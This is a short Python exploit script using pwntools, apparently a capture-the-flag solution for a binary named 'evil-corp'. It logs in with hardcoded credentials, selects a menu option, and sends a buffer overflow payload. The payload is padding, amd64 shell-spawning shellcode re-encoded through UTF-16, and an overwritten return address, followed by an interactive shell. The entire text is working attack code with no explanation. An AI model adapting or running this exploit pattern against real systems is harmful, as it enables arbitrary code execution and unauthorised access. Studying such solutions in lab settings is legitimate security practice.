#!/usr/bin/python3
from pwn import process, asm, shellcraft

shell = process("./evil-corp")

shell.sendlineafter(b"Username: ", b"eliot")
shell.sendlineafter(b"Password: ", b"4007")
shell.sendlineafter(b">> ", b"2")

shellcode = asm(shellcraft.amd64.sh(), arch="amd64")

payload  = b""
payload += b"A" * (2040 + len(shellcode))      # offset
payload += shellcode.decode("utf-16").encode() # shellcode
payload += b"B" * (4045 - len(payload))        # padding
payload += "\U00011000".encode()               # shellcode addr
payload += "\U00000000".encode()               # null terminator

shell.sendlineafter(b"\n\n", payload)
shell.recvuntil(b"\xa2 \n")

shell.interactive()
